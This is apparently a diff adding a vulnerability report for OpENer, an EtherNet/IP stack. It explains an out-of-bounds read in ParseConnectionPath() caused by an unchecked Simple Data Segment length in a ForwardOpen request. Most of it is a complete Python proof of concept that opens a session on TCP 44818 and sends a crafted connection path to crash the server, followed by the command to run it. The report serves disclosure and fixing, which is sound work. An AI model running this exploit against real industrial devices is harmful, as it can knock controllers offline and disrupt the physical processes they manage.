@@ -1,0 +1,158 @@
+issue #570
+
+Summary
+A malformed ForwardOpen request can trigger a network-reachable out-of-bounds read in OpENer during connection-path parsing.
+
+The root cause is in ParseConnectionPath(): when parsing a trailing Simple Data Segment in the connection path, the code trusts the segment-declared length (message[1]) and uses it to both decrement remaining_path and advance message, but it does not verify that the declared length still fits within the currently remaining path budget. This can make remaining_path underflow and move message beyond the request buffer. On the next loop iteration, GetPathSegmentType(message) dereferences that out-of-bounds pointer and crashes the server.
+
+The crash is reachable through the real TCP 44818 request path:
+
+HandleDataOnTcpSocket()
+→ HandleReceivedExplictTcpData()
+→ HandleReceivedSendRequestResponseDataCommand()
+→ NotifyCommonPacketFormat()
+→ NotifyMessageRouter()
+→ NotifyClass()
+→ ForwardOpen()
+→ ForwardOpenRoutine()
+→ HandleNonNullNonMatchingForwardOpenRequest()
+→ ParseConnectionPath()
+→ GetPathSegmentType().
+HandleNonNullNonMatchingForwardOpenRequest() invokes ParseConnectionPath() before any open_connection_function is called, so a valid ForwardOpen request necessarily reaches the vulnerable parser first.
+
+PoC
+
+#!/usr/bin/env python3
+import socket
+import struct
+import sys
+
+
+HOST = "127.0.0.1"
+PORT = 44818
+
+
+def encap(command: int, session: int, payload: bytes, context: bytes) -> bytes:
+    return struct.pack("<HHII8sI", command, len(payload), session, 0, context, 0) + payload
+
+
+def register_session(sock: socket.socket) -> int:
+    request = encap(0x0065, 0, struct.pack("<HH", 1, 0), b"REGSESSN")
+    sock.sendall(request)
+    response = sock.recv(1024)
+    if len(response) < 8:
+      raise RuntimeError(f"short RegisterSession response: {response.hex()}")
+    return struct.unpack_from("<I", response, 4)[0]
+
+
+def wrap_send_rr_data(session: int, cip: bytes, context: bytes) -> bytes:
+    cpf = struct.pack(
+        "<IHHHHHH",
+        0,          # interface handle
+        0,          # timeout
+        2,          # item count
+        0x0000,     # Null Address Item
+        0x0000,     # Null Address length
+        0x00B2,     # Unconnected Data Item
+        len(cip),
+    ) + cip
+    return encap(0x006F, session, cpf, context)
+
+
+def build_forward_open(path_bytes: bytes) -> bytes:
+    # Message Router: ForwardOpen service to Connection Manager class 0x06, instance 1.
+    cip = bytes([0x54, 0x02, 0x20, 0x06, 0x24, 0x01])
+
+    # Baseline request values chosen to match the default POSIX sample app:
+    # - exclusive owner path: config 151 / O->T 150 / T->O 100
+    # - O->T size 38 (32 bytes + class1 seq + run/idle)
+    # - T->O size 34 (32 bytes + class1 seq)
+    cip += struct.pack(
+        "<BBIIHHIB3xIHIHB",
+        0x0A,        # priority/tick
+        0x0E,        # timeout ticks
+        0x11111111,  # O->T connection ID
+        0x22222222,  # T->O connection ID
+        0x1234,      # connection serial
+        0x4321,      # vendor ID
+        0xCAFEBABE,  # originator serial
+        0x01,        # timeout multiplier
+        100000,      # O->T RPI
+        0x4026,      # O->T point-to-point, fixed, size 38
+        100000,      # T->O RPI
+        0x4022,      # T->O point-to-point, fixed, size 34
+        0x01,        # class 1, cyclic
+    )
+
+    cip += struct.pack("<B", len(path_bytes) // 2)
+    cip += path_bytes
+    return cip
+
+
+def parse_mr_reply(response: bytes) -> None:
+    if not response:
+        print("response=timeout")
+        return
+
+    # ENIP header (24) + interface handle/timeout (6) + item count (2)
+    # + Null Address Item (4) + Data Item header (4)
+    offset = 24 + 6 + 2 + 4 + 4
+    mr = response[offset:]
+    if len(mr) < 4:
+        print(f"response={response.hex()}")
+        return
+
+    reply_service, _reserved, general_status, add_status_size = mr[:4]
+    pos = 4
+    add_status = []
+    for _ in range(add_status_size):
+        add_status.append(struct.unpack_from("<H", mr, pos)[0])
+        pos += 2
+
+    print(
+        f"reply_service=0x{reply_service:02x} general_status=0x{general_status:02x} "
+        f"additional_status={add_status} payload={mr[pos:].hex()}"
+    )
+
+
+def main() -> int:
+    mode = sys.argv[1] if len(sys.argv) > 1 else "baseline"
+    if mode not in {"baseline", "crash"}:
+        print(f"usage: {sys.argv[0]} [baseline|crash]", file=sys.stderr)
+        return 2
+
+    # Valid exclusive-owner connection path for the default sample app.
+    base_path = bytes([0x20, 0x04, 0x24, 0x97, 0x2C, 0x96, 0x2C, 0x64])
+
+    if mode == "baseline":
+        path = base_path
+        context = b"FWDGOOD!"
+    else:
+        # Add one remaining word of path, but claim 0xff words of simple data.
+        # This makes ParseConnectionPath() underflow remaining_path and advance
+        # message far beyond the request buffer before the next GetPathSegmentType().
+        path = base_path + bytes([0x80, 0xFF])
+        context = b"FWDBAD!!"
+
+    cip = build_forward_open(path)
+    print(f"mode={mode} cip_len={len(cip)}")
+
+    with socket.create_connection((HOST, PORT), timeout=3.0) as sock:
+        session = register_session(sock)
+        print(f"session={session}")
+        request = wrap_send_rr_data(session, cip, context)
+        sock.sendall(request)
+        sock.settimeout(1.0)
+        try:
+            response = sock.recv(4096)
+        except socket.timeout:
+            response = b""
+
+    parse_mr_reply(response)
+    return 0
+
+
+if __name__ == "__main__":
+    raise SystemExit(main())
+
+python3 poc.py crash
